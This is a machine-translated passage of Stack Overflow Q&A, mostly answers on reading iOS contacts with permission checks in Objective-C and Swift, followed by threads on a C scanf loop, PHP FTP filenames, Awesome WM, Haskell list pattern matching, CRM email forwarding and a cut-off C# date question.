                    //for image
                    if (!ABPersonHasImageData(record)){

                    }
                    else{
                        CFDataRef imageData = ABPersonCopyImageData(record);
                        UIImage *image = [UIImage imageWithData:(NSData *) imageData];
                        [dic setObject:image forKey:@"image"];
                        CFRelease(imageData);
                    }
                    //To set Mobile
                    NSMutableArray* mobileArray = [[NSMutableArray alloc] init];
                    ABMutableMultiValueRef multi = ABRecordCopyValue(record, kABPersonPhoneProperty);
                    if (ABMultiValueGetCount(multi) > 0) {
                        // collect all emails in array
                        for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) {

                            CFStringRef mobileRef = ABMultiValueCopyValueAtIndex(multi, i);
                            CFStringRef locLabel = ABMultiValueCopyLabelAtIndex(multi, i);
                            NSString *phoneLabel =(NSString*) ABAddressBookCopyLocalizedLabel(locLabel);

                            if([phoneLabel isEqualToString:@"mobile"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            else if([phoneLabel isEqualToString:@"iPhone"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            else if([phoneLabel isEqualToString:@"home"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            else if([phoneLabel isEqualToString:@"work"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            else if([phoneLabel isEqualToString:@"main"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            else if([phoneLabel isEqualToString:@"other"])
                                [mobileArray addObject:(NSString *)mobileRef];
                            CFRelease(mobileRef);
                            CFRelease(locLabel);
                        }
                    }
                    CFRelease(multi);
                    if([mobileArray count]>0)
                        strMobile = [[mobileArray objectAtIndex:0]retain];
                    else{
                        NSString *str=[NSString stringWithFormat:@"noNumber%i",noNumberCount];
                        strMobile = [str retain];
                        noNumberCount++;
                    }
                    [mobileArray release];

                    //To set E-mail
                    NSMutableArray* emailArray = [[NSMutableArray alloc] init];
                    multi = ABRecordCopyValue(record, kABPersonEmailProperty);
                    if (ABMultiValueGetCount(multi) > 0) {
                        // collect all emails in array
                        for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) {
                            CFStringRef emailRef = ABMultiValueCopyValueAtIndex(multi, i);
                            [emailArray addObject:(NSString *)emailRef];
                            CFRelease(emailRef);
                        }
                    }

                    CFRelease(multi);
                    if([emailArray count]>0)
                        strEmail = [[emailArray objectAtIndex:0]retain];
                    else
                        strEmail = [@"noemail" retain];
                    [emailArray release];

                    bool addBool = NO;

                    if([strName isEqualToString:@"noName"]){
                        if([strEmail isEqualToString:@"noemail"]){

                        }
                        else{
                            [dic setObject:strEmail forKey:@"name"];
                            addBool = YES;
                        }

                        if(addBool == NO){
                            if([strMobile isEqualToString:@"noNumber"]){

                            }
                            else{
                                [dic setObject:strMobile forKey:@"name"];
                                addBool = YES;
                            }
                        }
                    }
                    else{
                        [dic setObject:strName forKey:@"name"];
                        addBool = YES;
                    }
                    [dic setObject:strEmail forKey:@"email"];
                    [dic setObject:strMobile forKey:@"mobile"];
                    [dic setObject:nsDate forKey:@"date"];
                    [dic setObject:strTime forKey:@"time"];
                    [dic setObject:strNotes forKey:@"notes"];

                    if(addBool == YES)
                        [contactArrTemp addObject:dic];

                    if([strMobile hasPrefix:@"0"]){
                        NSString *contactNumber=[strMobile stringByReplacingCharactersInRange:NSMakeRange(0, 1) withString:@""];
                        if(contactNumber.length>7)
                            [dic setObject:@"iPhone" forKey:@"ContactType"];

                    }
                    else {
                        if(strMobile.length>9)
                            [dic setObject:@"iPhone" forKey:@"ContactType"];

                    }
                    if(![[dic objectForKey:@"ContactType"] isKindOfClass:[NSNull class]] && [dic objectForKey:@"ContactType"])
                    {
                        [self InsertContactWithContactInfoDictionary:dic];
                    }
                    [strName release];
                    [nsDate release];
                    [strEmail release];
                    [strMobile release];
                    [strTime release];
                    [strNotes release];
                    [dic release];
                }
                dispatch_async(self.backgroundQueue, ^(void){ [self gcdDidFinishaddfebriteParsing:dict]; });
                dispatch_release(self.backgroundQueue);
                self.backgroundQueue=nil;
            });

        }
    }
    else
    {
        [[NSNotificationCenter defaultCenter] postNotificationName:@"PhoneContactsSaved" object:nil userInfo:[NSDictionary dictionaryWithObject:[NSNumber numberWithBool:YES] forKey:@"Successful"]];
        [[NSNotificationCenter defaultCenter] postNotificationName:@"updateContacts" object:nil userInfo:[NSDictionary dictionaryWithObject:@"success" forKey:@"update"]];
    }
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-09-21T06:49:25.247

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    [self loadPhoneContacts];
}

-(void)loadPhoneContacts{

    ABAuthorizationStatus status = ABAddressBookGetAuthorizationStatus();

    if (status == kABAuthorizationStatusDenied) {
        // if you got here, user had previously denied/revoked permission for your
        // app to access the contacts, and all you can do is handle this gracefully,
        // perhaps telling the user that they have to go to settings to grant access
        // to contacts

        [[[UIAlertView alloc] initWithTitle:nil message:@"This app requires access to your contacts to function properly. Please visit to the \"Privacy\" section in the iPhone Settings app." delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil] show];
        return;
    }

    CFErrorRef error = NULL;
    ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, &error);

    if (error) {
        NSLog(@"ABAddressBookCreateWithOptions error: %@", CFBridgingRelease(error));
        if (addressBook) CFRelease(addressBook);
        return;
    }

    if (status == kABAuthorizationStatusNotDetermined) {

        // present the user the UI that requests permission to contacts ...

        ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
            if (error) {
                NSLog(@"ABAddressBookRequestAccessWithCompletion error: %@", CFBridgingRelease(error));
            }

            if (granted) {
                // if they gave you permission, then just carry on

                [self listPeopleInAddressBook:addressBook];
            } else {
                // however, if they didn't give you permission, handle it gracefully, for example...

                dispatch_async(dispatch_get_main_queue(), ^{
                    // BTW, this is not on the main thread, so dispatch UI updates back to the main queue

                    [[[UIAlertView alloc] initWithTitle:nil message:@"This app requires access to your contacts to function properly. Please visit to the \"Privacy\" section in the iPhone Settings app." delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil] show];
                });
            }

            if (addressBook) CFRelease(addressBook);
        });

    } else if (status == kABAuthorizationStatusAuthorized) {
        [self listPeopleInAddressBook:addressBook];
        if (addressBook) CFRelease(addressBook);
    }
}

- (void)listPeopleInAddressBook:(ABAddressBookRef)addressBook
{
    NSInteger numberOfPeople = ABAddressBookGetPersonCount(addressBook);
    NSArray *allPeople = CFBridgingRelease(ABAddressBookCopyArrayOfAllPeople(addressBook));

    for (NSInteger i = 0; i < numberOfPeople; i++) {
        ABRecordRef person = (__bridge ABRecordRef)allPeople[i];

        NSString *firstName = CFBridgingRelease(ABRecordCopyValue(person, kABPersonFirstNameProperty));
        NSString *lastName  = CFBridgingRelease(ABRecordCopyValue(person, kABPersonLastNameProperty));
        NSLog(@"Name:%@ %@", firstName, lastName);

        ABMultiValueRef phoneNumbers = ABRecordCopyValue(person, kABPersonPhoneProperty);

        CFIndex numberOfPhoneNumbers = ABMultiValueGetCount(phoneNumbers);
        for (CFIndex i = 0; i < numberOfPhoneNumbers; i++) {
            NSString *phoneNumber = CFBridgingRelease(ABMultiValueCopyValueAtIndex(phoneNumbers, i));
            NSLog(@"  phone:%@", phoneNumber);
        }

        CFRelease(phoneNumbers);

        NSLog(@"=============================================");
    }
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2019-10-23T11:45:41.467

根据 iOS 最近的苹果开发文档，除了[AddressBook之外，苹果坚持使用](https://developer.apple.com/documentation/addressbook?language=objc)[Contact](https://developer.apple.com/documentation/contacts?language=objc)。

```
CNAuthorizationStatus authorizationStatus = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    switch (authorizationStatus) {
        case CNAuthorizationStatusNotDetermined: {

            break;
        }
        case CNAuthorizationStatusRestricted: {

            break;
        }
        case CNAuthorizationStatusDenied:{

            return;
        }
            break;
        case CNAuthorizationStatusAuthorized: {

            break;
        }
    } 
```

以上目标c代码有助于查找天气联系人访问权限是否被授予。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-05-03T09:41:17.150

如果有人对 iOS5 中的地址簿有疑问，请使用

```
ABAddressBookRef addressBook = ABAddressBookCreate(); 
```

安装在

```
ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL,NULL); 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2017-06-02T17:22:00.983

Swift 3\. 不要忘记导入联系人

```
func requestForContactAccess(completionHandler: @escaping (_ accessGranted: Bool) -> Void) {
    let authorizationStatus = CNContactStore.authorizationStatus(for: CNEntityType.contacts)
    switch authorizationStatus {
    case .authorized:
        completionHandler(true)
    case .denied, .notDetermined:
        self.contactStore.requestAccess(for: CNEntityType.contacts, completionHandler: { (access, accessError) -> Void in
            if access {
                completionHandler(access)
            } else {
                if authorizationStatus == CNAuthorizationStatus.denied {
                    DispatchQueue.main.async(execute: { () -> Void in
                        let message = "\(accessError!.localizedDescription)\n\nPlease allow the app to access your contacts through the Settings."
                        self.showMessage(message: message)
                    })
                }
            }
        })
    default:
        completionHandler(false)
    }
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-07-15T14:43:59.763

```
ABAddressBookRequestAccessWithCompletion(ABAddressBookCreateWithOptions(NULL, nil), ^(bool granted, CFErrorRef error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            if (!granted){
                    [[[UIAlertView alloc] initWithTitle:@"Contacts Access Denied"
                                                message:@"This app requires access to your device's Contacts.\n\nPlease enable Contacts access for this app in Settings / Privacy / Contacts"
                                               delegate:nil
                                      cancelButtonTitle:@"Dismiss"
                                      otherButtonTitles:nil] show];
            } else {
                //access authorized
            }
        });
    }); 
```

为 InfoPlist.strings 中的警报使用添加描述。

`NSContactsUsageDescription = "TESTING!";`

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-09-28T23:50:21.510

使用 iOS 6，您必须像这样请求许可

```
requestAccessToEntityType:EKEntityTypeEvent completion: 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-12-10T13:54:36.960

在 ios 中获取通讯录

```
- (void)retreiveAllContacts
{
ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, NULL);

CFArrayRef people = ABAddressBookCopyArrayOfAllPeople(addressBook);

if (!people) {
    return ;
}

CFMutableArrayRef peopleMutable = CFArrayCreateMutableCopy(kCFAllocatorDefault,
                                                           CFArrayGetCount(people),
                                                           people);

CFArraySortValues(peopleMutable,
                  CFRangeMake(0, CFArrayGetCount(peopleMutable)),
                  (CFComparatorFunction) ABPersonComparePeopleByName,
                  (void*) ABPersonGetSortOrdering());

NSMutableArray *contacts = [[NSMutableArray alloc] initWithCapacity:CFArrayGetCount(peopleMutable)];

for (CFIndex i = 0; i < CFArrayGetCount(peopleMutable); i++)
{

    ABRecordRef person = CFArrayGetValueAtIndex(peopleMutable, i);

    int32_t recId  =  ABRecordGetRecordID(person);

    NSString * abId = [NSString stringWithFormat:@"%d", recId];

    ABMultiValueRef phoneNumbers = ABRecordCopyValue(person, kABPersonPhoneProperty);

    ABMultiValueRef emailIds = ABRecordCopyValue(person, kABPersonEmailProperty);

    NSString* firstName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonFirstNameProperty);

    NSString* lastName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonLastNameProperty);

    NSString* companyName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonOrganizationProperty);

    NSString* displayName = [firstName ? firstName : @"" stringByAppendingFormat:@" %@", lastName ? lastName : @""];

    displayName = [displayName stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@" "]];

    NSMutableDictionary* contactInfo = [[NSMutableDictionary alloc] init];

    if(ABPersonHasImageData(person))
    {
        CFDataRef imageDataRef = ABPersonCopyImageDataWithFormat(person, kABPersonImageFormatThumbnail);

        NSData * imageData = (__bridge NSData *)imageDataRef;

        UIImage * thumbImage = [UIImage imageWithData:imageData];

        [contactInfo setObject:thumbImage forKey:@"picture"];
    }

    if(!firstName)
        firstName = @"";

    if (!lastName)
        lastName = @"";

    if(!displayName)
        displayName = @"";

    if(!companyName)
        companyName = @"";

   // [contactInfo setObject:[firstName capitalizedString] forKey:kFirstNameKey];

    //[contactInfo setObject:[lastName capitalizedString] forKey:kLastNameKey];

    [contactInfo setObject:[displayName capitalizedString] forKey:@"name"];

    [contactInfo setObject:abId forKey:@"ABID"];

  //  [contactInfo setObject:companyName forKey:kCompanyNameKey];

    NSMutableArray* phoneNumbersList = [[NSMutableArray alloc] init];

    for (CFIndex j=0; j < ABMultiValueGetCount(phoneNumbers); j++)
    {
        NSString* phone = (__bridge NSString*)ABMultiValueCopyValueAtIndex(phoneNumbers, j);

        CFStringRef localizedLabel = ABMultiValueCopyLabelAtIndex(phoneNumbers,j);

      //  NSString *phoneLabel =(__bridge NSString*) ABAddressBookCopyLocalizedLabel(localizedLabel);

        if( phone)
        {
            //                NSLog(@"validatedPhone: %@", validatedPhone);

            [phoneNumbersList addObject:phone];
        }

        if (localizedLabel) {
            //                            NSLog(@"localizedLabel: %@", localizedLabel);
            CFRelease(localizedLabel);
        }
    }

    if(phoneNumbers)
    {
        //                        NSLog(@"phoneNumbers: %@", phoneNumbers);

        CFRelease(phoneNumbers);

        //            NSLog(@"phoneNumbers Release: %@", phoneNumbers);

    }

    [contactInfo setObject:phoneNumbersList forKey:@"phoneNumbers"];

    NSMutableArray * emailList = [[NSMutableArray alloc] init];

    for (CFIndex j=0; j < ABMultiValueGetCount(emailIds); j++)
    {
        NSString* email = (__bridge NSString*)ABMultiValueCopyValueAtIndex(emailIds, j);

        CFStringRef localizedLabel = ABMultiValueCopyLabelAtIndex(emailIds, j);

        if(email)
        {

            [emailList addObject:email];
        }

    }

    if(emailIds)
    {
        CFRelease(emailIds);

    }

    if(emailList && [emailList count])
        [contactInfo setObject:emailList forKey:@"emails"];

    if ([phoneNumbersList count] > 0 || [emailList count] > 0) {
        [contacts addObject:contactInfo];
    }
}

//CFRelease();
CFRelease(people);

if([contacts count])
{
    [self createiOSContactsDataSourceWithFeed:contacts];
}

} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-06-19T12:16:49.067

此代码显示如何设置权限以及如何从手机中获取所有联系人并在列表中显示带有标签标签的联系人

```
var contactStore = CNContactStore()
var contactArray = [CNContact]()

func getContacts()
{

    if CNContactStore.authorizationStatus(for: .contacts) == .notDetermined
    {

        contactStore.requestAccess(for: .contacts, completionHandler: { (authorized:Bool, error:Error?) in

            if authorized {

                let requestForContacts = CNContactFetchRequest(keysToFetch: [CNContactFormatter.descriptorForRequiredKeys(for: CNContactFormatterStyle.fullName), CNContactPhoneNumbersKey as CNKeyDescriptor, CNContactImageDataKey as CNKeyDescriptor, CNContactNicknameKey as CNKeyDescriptor])
                do{
                    try self.contactStore.enumerateContacts(with: requestForContacts) { (contacts : CNContact, stop: UnsafeMutablePointer<ObjCBool>) -> Void in
                        self.contactArray.append(contacts)
                        //print("hello")
                    }
                }
                catch {
                    print("EXCEPTION COUGHT")
                }
            }
        })
    }
    else if CNContactStore.authorizationStatus(for: .contacts) == .authorized
    {
        let requestForContacts = CNContactFetchRequest(keysToFetch: [CNContactFormatter.descriptorForRequiredKeys(for: CNContactFormatterStyle.fullName), CNContactPhoneNumbersKey as CNKeyDescriptor, CNContactImageDataKey as CNKeyDescriptor, CNContactNicknameKey as CNKeyDescriptor])
        do{
            try self.contactStore.enumerateContacts(with: requestForContacts) { (contacts : CNContact, stop: UnsafeMutablePointer<ObjCBool>) -> Void in
                self.contactArray.append(contacts)
            }
        }
        catch {

        }

    }
}

override func viewDidLoad() {
    super.viewDidLoad()
    // Do any additional setup after loading the view, typically from a nib.
    getContacts()

}

func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int
{
    //print(contactArray)
    return contactArray.count

}
func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {

    let cell = tableView.dequeueReusableCell(withIdentifier: "defaultCell")

    if cell != nil{

        //var dig = String()
        var hmdig = [String]()

        let names = contactArray[indexPath.row]
        print(names)

        let name1 = names.givenName+" "+names.middleName+" "+names.familyName

        for number in names.phoneNumbers
        {
            let phoneNumber = number.value

            let dig = (phoneNumber.value(forKey: "digits") as? String)!
            hmdig.append(dig)

        }

        // Set the contact image.
        if let imageData = names.imageData
        {
            let myImage = cell?.viewWithTag(30) as! UIImageView
            myImage.image = UIImage(data: imageData)
        }

//            let niknm = names.nickname

        let nameLable1 = cell?.viewWithTag(10) as! UILabel
                nameLable1.text = name1

        let nameLable2 = cell?.viewWithTag(20) as? UILabel

            nameLable2?.text = hmdig.joined(separator: ",\n")

//           let nameLable3 = cell?.viewWithTag(40) as? UILabel
//                nameLable3?.text = niknm

        return cell!

    }
    else{

        return UITableViewCell()
    }
} 
```

# c - 中断的 Do/While 循环

> ID：12648246
> 
> 赞同：0
> 
> 时间：2012-09-28T22:38:13.280
> 
> 标签：c

```
char again;
do {
            counter = 0;
            while (counter < 3) {
               printf("Please enter a number: ");
               scanf("%d", &num);
               counter++;
               sum += num;
            }
            if (counter == 3) {
                printf("Would you like to continue? [Y]Yes [N]No:");
                scanf("%c", &again);
            } 
        }while (again == 'Y'); 
```

我似乎无法弄清楚为什么这不起作用。如果我输入 Y 它会中断，如果我输入 N 它会中断。我需要循环直到用户输入“N”退出程序并且没有其他字母。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T22:42:11.847

将调用更改`scanf`为：

```
scanf(" %c", &again); 
```

诀窍是在`%c`: 之前的空格中，它指示函数在返回 N 或 Y 之前忽略任何空白字符。否则，您将读取先前调用`scanf`的回车符。`scanf`

从[`man 3p scanf`](http://pubs.opengroup.org/onlinepubs/007904975/functions/scanf.html)（POSIX 一）：

> 由一个或多个空白字符组成的指令应通过读取输入来执行，直到无法读取更多有效输入，或者直到第一个不是空白字符的字节仍然未读取。

那是一个复杂的功能。我建议仔细阅读手册页：它可以做的比大多数人想象的要多得多。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:42:45.160

问题是`scanf("%c", &again)`在最后一个数字之后读取换行符，这就是循环总是中断的原因。这也是人们回避`scanf()`plus`fgets()`的原因`sscanf()`；您往往会获得更好的诊断，并减少像这样的讨厌的陷阱。

你怎么能自己调试呢？

您可以打印在读取时读取的数据 - 添加：

```
printf("Read: %d\n", again); 
```

之后`scanf()`。此外，您应该检查每个`scanf()`调用以确保您获得预期的数据：

```
if (scanf("%c", &again) != 1)
    ...oops — error handling... 
```

# php - 文件名中的 PHP FTP 特殊字符 - 无法获取修改日期

> ID：12648251
> 
> 赞同：0
> 
> 时间：2012-09-28T22:38:37.677
> 
> 标签：php, character-encoding, ftp

使用 PHP 通过 FTP 下载文件。

我无法控制服务器文件名。

我`ftp_nlist`用来获取目录中的文件，但是当我使用相同的文件名来获取修改日期时，我得到 -1（错误的文件名）作为结果。

`ftp_mdtm`仅对带有特殊字符的文件名（例如德语 a 或 e）失败

```
$list = ftp_nlist($ftpconn, FTP_PCPATH);
foreach($list as $file){
        $src_file = FTP_PCPATH . DIRECTORY_SEPARATOR . $file;
        $md = ftp_mdtm($ftpconn, $src_file);
        if($md == -1){
            echo $src_file . ": " . $md . "\n";
        }
    } 
```

这将打印所有带有特殊字符的文件名和 -1 结果。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T22:56:16.137

听起来像一个unicode支持问题。PHP 已经（大部分）支持 unicode 有一段时间了。您的 FTP 服务器是否打开了 BINARY 模式，或者它可能不支持或未激活 unicode 支持？

当您使用终端 FTP 到此服务器然后尝试对其中包含特殊字符的文件执行操作时会发生什么情况？

# screen - 在 Awesome WM 中打开程序到活动/选定屏幕

> ID：12648254
> 
> 赞同：7
> 
> 时间：2012-09-28T22:38:53.830
> 
> 标签：screen, multiple-monitors, awesome-wm

我一直在使用带有双屏设置的 Awesome WM 有一段时间了，但我不知道如何配置 awesome，以便当我打开程序时，它会在当前活动/选定的屏幕上打开。目前，所有程序都在我的笔记本电脑屏幕上启动，但是当焦点在外接显示器上时，我希望有任何程序，然后我开始在外接显示器上打开，而不是在笔记本电脑屏幕上。

如何配置此行为？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-09T19:10:24.630

您要做的是`manage`为客户修改信号；每当产生新客户端时都会发出此信号。在 awesome 的最新版本中，这个信号在默认的 rc.lua 中使用，相关代码开头是这样的：

```
client.connect_signal("manage", function (c, startup) 
```

您将希望将以下代码添加到传递给该信号的函数中：

```
awful.client.movetoscreen(c, mouse.screen) 
```

这告诉真棒将客户端移动到鼠标所在的屏幕。如果您愿意，也可以对活动客户端所在的屏幕执行此操作：

```
awful.client.movetoscreen(c, client.focus.screen) 
```

# haskell - 使用模式查找第 n 个元素

> ID：12648255
> 
> 赞同：7
> 
> 时间：2012-09-28T22:38:57.287
> 
> 标签：haskell

我正在通过*Learn You A Haskell*来学习 Haskell的基础知识。我对函数式编程和模式匹配都非常满意，但后者更喜欢*Mathematica*是如何做到的。

`head`本着与第 4.1 章中的幼稚实现相同的精神，我继续进行`last`如下的幼稚实现：

```
last1 :: [a] -> a
last1 (_:x:[]) = x 
```

但是，调用`last1 [1,2,3,4]`给出了错误`Exception: ... Non-exhaustive patterns in function last1`。我知道这个错误意味着指定的模式不涵盖所有可能的输入，通常需要一个包罗万象的模式（我没有提供）。但是，我不确定为什么我的输入会出现*此*错误。

**问题 1：**我的理解（我的错误方法）是第一个元素被捕获，`_`其余的被分配给`x`，这不是我想要的。但是，这不应该给出类型错误吗，因为我指定了`[a] -> a`, but `x`now is a list？

请注意，这*不是*关于如何编写一个工作`last`函数——我知道我可以把它写成（以及其他可能性）

```
last2 :: [a] -> a
last2 [x] = x
last2 (_:x) = last2 x 
```

**问题 2：**在更好地理解 Haskell 中的模式匹配的同一主题下，我如何使用模式匹配来挑选最后一个元素或更一般地，`n`从给定列表中挑选出第 th 个元素，比如说，`[1..10]`？

[这个答案](https://stackoverflow.com/a/7576910/616736)表明您可以使用与`ViewPatterns`扩展名匹配的模式来绑定最后一个元素，但似乎很奇怪没有类似的“简单”模式`head`

在*Mathematica*中，我可能会将其写为：

```
Range[10] /. {Repeated[_, {5}], x_, ___} :> x
(* 6 *) 
```

挑选出第 6 个元素和

```
Range[10] /. {___, x_} :> x
(* 10 *) 
```

挑选出非空列表的最后一个元素。

如果本文稍后会涉及到这一点，我深表歉意，但我试图将遇到的每个主题和概念与我知道的其他语言的处理方式联系起来，以便我能够理解差异和相似之处。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T23:08:26.157

要理解第一次尝试的结果，您需要查看列表数据是如何定义的。列表有一种特殊的语法，但你可以这样写。

```
data List a = (:) a (List a)
            | [] 
```

因此，您的列表 [1 .. 10] 实际上的结构为

```
(1 : (2 : (3 : (4 : [])))) 
```

此外，由于 (:) 运算符的正确关联性，您的 last1 模式实际上看起来像

```
last1 :: [a] -> a
last1 (_:(x:[])) = x 
```

这就是为什么 'x' 与列表中的元素具有相同类型的原因；它是 (:) 构造函数的第一个参数。

模式匹配允许您解构列表等数据结构，但您需要知道它们必须这样做的“形状”。这就是为什么您不能直接指定将提取列表的最后一个元素的模式，因为列表可以有无限多的长度。这就是为什么工作解决方案（last2）使用递归来解决问题的原因。您知道长度为 one 的列表具有什么模式以及在哪里可以找到最终元素；对于其他所有内容，您可以丢弃第一个元素并提取结果更短列表的最后一个元素。

如果你愿意，你可以添加更多的模式，但它不会被证明是有帮助的。你可以把它写成

```
last2 :: [a] -> a
last2 (x:[])     = x
last2 (_:x:[])   = x
last2 (_:_:x:[]) = x
        ...
last2 (x:xs) = last2 xs 
```

但是如果没有无限多的情况，您永远无法完成所有长度的输入列表的功能。当您考虑到列表实际上可以无限长的事实时，它就更加可疑了。你会用什么模式来匹配它？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T23:06:19.257

如果不使用视图模式，就无法让模式匹配获得“最后一个”元素。那是因为不使用递归（至少隐式地）就无法获取列表的最后一个元素，而且，没有*可*确定的方法来获取最后一个元素。

你的代码

```
last1 (_:x:[]) = x 
```

应该像这样解析

```
last1 (_:(x:[])) = x 
```

可以脱糖成

```
last1 a = case a of
               (_:b) -> case b of
                             (x:c) -> case c of
                                           [] -> x 
```

完成本练习后，我们将看到您的代码做了什么：您编写了一个匹配列表的模式，如果列表的最外层构造函数是 cons 单元格且下一个构造函数是 cons 且第三个构造函数是 nil。

所以在这种情况下

```
last1 [1,2,3,4] 
```

我们有

```
last1 [1,2,3,4] 
= last1 (1:(2:(3:(4:[]))))
= case (1:(2:(3:(4:[])))) of
       (_:b) -> case b of
                     (x:c) -> case c of
                                   [] -> x
= case (2:(3:(4:[]))) of
       (x:c) -> case c of
                     [] -> x
= let x = 2 in case (3:(4:[])) of
                    [] -> x
= pattern match failure 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-28T23:07:15.240

你的例子

```
last1 (_:x:[]) = x 
```

只匹配包含两个元素的列表，即表单的列表`a:b:[]`。`_`匹配没有绑定的链表头，`x`匹配后面的元素，空链表匹配自身。

当模式匹配列表时，只有最右边的项目代表一个列表 - 匹配列表的尾部。

您可以使用以下函数从列表中获取第 n 个元素：

```
getNth :: [a] -> Int -> a
getNth [] _ = error "Out of range"
getNth (h:t) 0 = h
getNth (h:t) n = getNth t (n-1) 
```

这个内置使用`!!`运算符，例如`[1..10] !! 5`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-29T02:18:26.880

您确实可以使用`ViewPatterns`在列表末尾进行模式匹配，所以让我们这样做：

```
{-# LANGUAGE ViewPatterns #-} 
```

并在我们进行模式匹配之前通过反转列表来重新定义您的`last1`and 。`last2`这使它成为*O(n)*，但这对于列表是不可避免的。

```
last1 (reverse -> (x:_)) = x 
```

语法

`mainFunction (viewFunction -> pattern) = resultExpression`

是语法糖

`mainFunction x = case viewFunction x of pattern -> resultExpression`

所以你可以看到它实际上只是反转列表然后模式匹配它，但感觉更好。 `viewFunction`就是你喜欢的任何功能。（扩展的目的之一是允许人们干净、轻松地使用访问器函数进行模式匹配，这样他们在定义函数时就不必使用其数据类型的底层结构。）

如果`last1`列表为空，则会出现错误，就像原始列表一样`last`。

`*Main> last []`
`*** Exception: Prelude.last: empty list`
`*Main> last1 []`
`*** Exception: Patterns.so.lhs:7:6-33: Non-exhaustive patterns in function last1`

好吧，好吧，不完全是，但我们可以通过添加来改变它

```
last1 _ = error "last1: empty list" 
```

这给了你

`*Main> last1 []`
`*** Exception: last1: empty list`

我们当然可以使用相同的技巧`last2`：

```
last2 (reverse -> (_:x:_)) = x
last2 _ = error "last2: list must have at least two elements" 
```

但是定义会更好

```
maybeLast2 (reverse -> (_:x:_)) = Just x
maybeLast2 _ = Nothing 
```

您可以使用例如以下方式进行`last4`：

```
last4 (reverse -> (_:_:_:x:_)) = x 
```

你可以看到，使用`reverse`视图模式，我们改变了`(_:_:_:x:_)`from `(ignore1st,ignore2nd,ignore3rd,get4th,ignoreTheRestOfTheList)`to 的语义`(ignoreLast,ignore2ndLast,ignore3rdLast,get4thLast,ignoreTheRestOfTheList)`。

您注意到在 Mathematica 中，下划线的数量用于表示被忽略的元素数量。在 Haskell 中，我们只使用 one `_`，但它可以用于*任何*被忽略的值，并且在存在非对称列表构造函数的情况下`:`，语义取决于你在哪一边，所以在 中`a:b`，`a`必须表示一个元素，而`b`必须是一个列表（这本身可能是`c:d`因为`:`它是正确的关联 -`a:b:c`意味着 `a:(b:c)`）。这就是为什么任何列表模式中的最后一个下划线都会重新表示`ignoreTheRestOfTheList`，并且在存在`reverse`视图函数的情况下，这意味着忽略列表的前面元素。

隐藏在 Mathematica 中的递归/回溯在这里通过 viewFunction `reverse`（它是一个递归函数）是明确的。

# project-management - 将电子邮件转发到 CRM 系统——有什么优势？

> ID：12648256
> 
> 赞同：0
> 
> 时间：2012-09-28T22:38:59.163
> 
> 标签：project-management, project, crm

我使用 Basecamp 作为试用版，Highrise 作为试用版，两者都提供将来自客户的电子邮件抄送到系统中的功能。我是一名网络开发人员，通常我的团队是我自己和一两个 IC 以及客户。我所有的电子邮件都非常高度地组织到客户特定的文件夹中——所以在这一点上，我试图弄清楚进行许多这些电子邮件对话的好处是什么（在我和客户之间/我和 IC 之间） 在线的？无论是 Highrise 中的潜在客户，还是 Basecamp 中正在进行的项目，将电子邮件放在两个地方有什么好处 - HR/BR 并归档在我的电子邮件文件夹中？

感谢您的任何见解！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-02T06:47:49.647

在[OpenCRM](http://opencrm.co.uk)，我们鼓励所有进出邮件的转发都由 CRM 轮询。从本质上讲，这允许从线索、联系人、公司或其他相关记录（例如销售订单或帮助台工单）中快速访问与消息的发起者或接收者相关的完整历史记录。

[使用允许这种级别的集成的CRM 软件](http://opencrm.co.uk/crm.html)是一个好主意，使您能够在积极处理数据中的特定记录时接收和响应消息。我们认为这可以节省时间和重复劳动。

# c# - C# 中的日期时间格式和 JSON 数据

> ID：12648257
> 
> 赞同：0
> 
> 时间：2012-09-28T22:39:02.323
> 
> 标签：c#, asp.net, json

我在 ASP.NET/C# 中遇到日期/时间格式问题。我将我的 SQL Server 数据库设置为 PostDate 字段设置为“日期时间”类型。但它以一种奇怪的格式保存日期。我通过表单添加了一个新行，并将其作为日期/时间字符串：

`2012-09-28 14:56:48.910`

当它被 JSON.NET 解析时，它变得更加陌生。我得到：

```
2012-09-28T14:56:48.91 
```

